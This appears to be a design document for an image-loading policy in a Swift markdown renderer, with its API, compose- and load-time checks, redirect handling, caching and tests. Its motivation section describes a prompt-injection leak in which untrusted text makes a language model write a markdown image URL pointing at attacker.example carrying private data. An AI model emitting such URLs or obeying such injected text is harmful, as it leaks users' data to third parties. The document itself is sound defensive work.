# Image-loading policy — design

A small change to the 2.x engine on `main`. Written 2026-11-14.

## 1. Why

Glimmer fetches every markdown image as soon as its text is laid out, and the host app has no say in which URLs are
fetched. When the markdown is written by a language model that has read untrusted text, that is a data-leak channel:
the text can tell the model to write `![x](https://attacker.example/?d=<private data>)`, and the view requests it
with no tap. The same works as a tracking pixel between users.

The host must be able to decide, per image, whether Glimmer loads it. The decision has to be made inside Glimmer,
because a text scanner in the app can disagree with Glimmer's parser about what is an image.

## 2. Goals

- One policy, set by the host on `GlimmerConfiguration`, decides every image load: load it, show its alt text, or
  show nothing.
- A blocked image causes no request of any kind, and nothing is shown for it from a cache.
- A blocked image is ordinary text (or nothing). It reserves no image space.
- With no policy set, behaviour is exactly what it is today.
- No host names in the library. The app supplies the rule.

**Not goals:** a built-in allowlist type, a demo screen, a 1.x backport, and policing links (they load only on a tap).

**Would be a failure:** any path from rendered markdown to a request that skips the policy, including a cache shared
between views.

## 3. Approaches

**Where the decision is made**

| | Trade-off |
|---|---|
| At load time only (a loader that refuses) | Possible today with a custom `imageLoader`. It stops the request, but the line-height square or the image box is already reserved, so the alt text cannot be laid out as text. |
| **At compose time, and again at load time (chosen)** | The composer builds text for a blocked image, so layout is right. The one place that calls a loader asks again, so a path that skipped the composer still cannot fetch. |

**What the policy is**

| | Trade-off |
|---|---|
| A closure | Shortest at the call site. Closures cannot be compared, so views with a policy could not share settled answers from `GlimmerDocumentCache`. |
| **A `Hashable` type (chosen by Willi)** | The app writes a small struct. Equal policies share cached answers, so feed cells keep their fast path. |

## 4. Design

### Public API

```swift
/// An image Glimmer is about to show, as the host's policy sees it.
public struct GlimmerImageCandidate: Sendable, Hashable {
    public enum Origin: Sendable, Hashable {
        /// Written as an image in the markdown, inline or reference-style.
        case markdown
        /// Produced by an extension's token (`GlimmerInlineToken.Presentation.image`), such as an emoji shortcode.
        case extensionToken(kind: String)
    }
    public var url: URL
    public var alt: String
    public var title: String?
    public var origin: Origin
}

public enum GlimmerImageDecision: Sendable, Hashable {
    case load          // Show the image.
    case showAltText   // Show the alt text as ordinary text. Empty alt text shows nothing.
    case hide          // Show nothing.
}

public protocol GlimmerImagePolicy: Sendable, Hashable {
    func decision(for image: GlimmerImageCandidate) -> GlimmerImageDecision
}
```

`GlimmerConfiguration` gains `imagePolicy: (any GlimmerImagePolicy)?`, default `nil`.

The policy's contract, stated in its doc comment: it is called from any thread, more than once for the same image
(every recompose while streaming, and again before the load), so it must be quick and give the same answer each time.
Two policies that compare equal must decide equally.

`GlimmerImageRequest` gains `permitsRedirect(to:) -> Bool`, so a custom loader can ask about a redirect target. It is
`true` when no policy is set.

### Compose time

All images are created at two sites in `GlimmerComposer`: `standaloneImage` and `appendInlineImage`. The second also
serves images in links, lists, quotes and table cells, and extension tokens.

- `standaloneImage` returns an image only when the decision is `.load`. Otherwise the paragraph composes as text.
- `appendInlineImage`, per decision:
  - `.load`: as today, and the attachment carries the policy and the candidate for the load-time check.
  - `.showAltText`: the alt text with the surrounding run's attributes (so it is bold in bold, a link in a link).
  - `.hide`: nothing.
- An extension token with `.image(url)` that is not loaded shows as the token's `.text` presentation: its
  `displayText`, copying as the token's `source`. For an emoji shortcode with no Unicode form that is `:name:`.
- A paragraph or heading left with nothing but spaces and line breaks after an image was dropped is omitted. A list
  item keeps its marker. `GlimmerStreamingDocument` already handles blocks that emit no text.
- An image that shows nothing takes with it the white space that stood only around it: spaces at the start or end of
  its line, one of two spaces it stood between, and the break of a line that held nothing else (added after review).
- The first block that shows text has no heading space above it when every block before it was left out by the
  policy. A block that shows nothing by itself, such as an empty quote, does not count (narrowed after review).

### Load time and redirects

`GlimmerImageViewLoader` is the only caller of `GlimmerImageLoader`. Given a policy, it asks again just before the
call, and a refusal fails the load without calling the loader. An image that carries no policy, inside a view that
has one, is refused too: it did not come from that view's composer.

The built-in loader asks the policy on every redirect, with the same candidate and the redirect's URL. A refused
redirect is not followed and the load fails. Downloads in flight are shared only between requests for the same image
(URL, alt, title and origin) under equal policies, so a view with a policy never rides on a request made without one,
or on one the policy could answer differently about.

### Document cache

`GlimmerDocumentCache.Key` includes the policy. A view with a policy never receives text composed without it, or
under a different one.

## 5. Calls I made

These were not in the brief. Correct any of them.

1. **Every image URL goes to the policy,** whatever its scheme: relative names, `file:` and `data:` too. "Remote" is
   not a line the library can draw safely, since `URLSession` loads `file:` URLs.
2. **A blocked image copies as what is shown** (the alt text, or the shortcode), not as `![alt](url)`. The host has
   said the URL must not be fetched; pasting it into another renderer would fetch it. This includes
   `markdownSource()` with no range, which under a policy returns the markdown of the shown text instead of the
   answer as given (added after review).
3. **An unparseable URL under a policy shows the alt text as ordinary text.** The policy cannot be asked without a
   URL. With no policy it stays as today (dimmed alt text).
4. **A refused redirect leaves the placeholder,** not alt text. The text is already laid out by then.
5. **A custom loader that follows redirects itself is not checked** unless it calls `permitsRedirect(to:)`. The
   README says so.
6. **A blocked image is not an image to the rest of the engine:** `onImageTap` never fires for it, and VoiceOver
   reads its alt text as text.
7. **Not committed yet.** I will commit when you say so.

## 6. What does not load

Checked across `Sources/Glimmer/Engine`: the only network call is `GlimmerImageCache`'s `URLSession`. Raw HTML is
shown as literal text, so `<img>` never loads. Reference-style images reach the composer as ordinary image nodes.
There is no font or favicon loading. `markdownSource(for:)`, `plainText(for:)` and accessibility read text and load
nothing.

Two corrections after review:

- **Partial URLs while streaming.** Streaming holds an incomplete inline image back, so its partial URL is never an
  image. A reference-style image is different, and was before this change: its definition line (`[ref]: https://…`)
  is complete to the parser at every prefix, so while it streams, each prefix of the URL is an image. Under a policy
  each prefix is put to the policy; with none, each is requested.
- **Link previews.** When the host sets `linkMenuActions`, a long press on a link shows the system's menu with its
  default preview of the link, which can load the page. It happens only on the user's long press, and links are not
  policed.

## 7. Tests

In `Tests/GlimmerTests/Engine/GlimmerImagePolicyTests.swift`, one case per branch, each written first and seen to fail:

- A blocking policy makes zero loader calls for: an inline image, an image in a link, a list, a quote and a table
  cell, a reference-style image, a standalone image, an emoji shortcode image, and the same markdown streamed in
  pieces.
- A policy that allows some URLs: exactly those are requested.
- Alt text renders as text with its neighbours' attributes, and an empty alt renders nothing.
- `.hide` renders nothing, and a paragraph of only hidden images leaves no blank line.
- A blocked standalone image is as tall as the same alt text written as a paragraph.
- A blocked emoji shortcode image renders `:name:`.
- An unparseable URL under a policy renders its alt text.
- With no policy, an image still loads.
- The view loader does not call the loader when the policy refuses.
- The built-in loader does not request a refused redirect target (`ImageTestServer`).
- A settled answer composed without a policy is not reused by a view with one.
- Copy of a blocked image round-trips (`assertEquivalent`).

## 8. Docs and PR

The README gets an "Image policy" section: how to set it, what it receives, what each answer does, and the redirect
rule. The PR description lists the load sites and how each consults the policy, the redirect behaviour, and section 6.
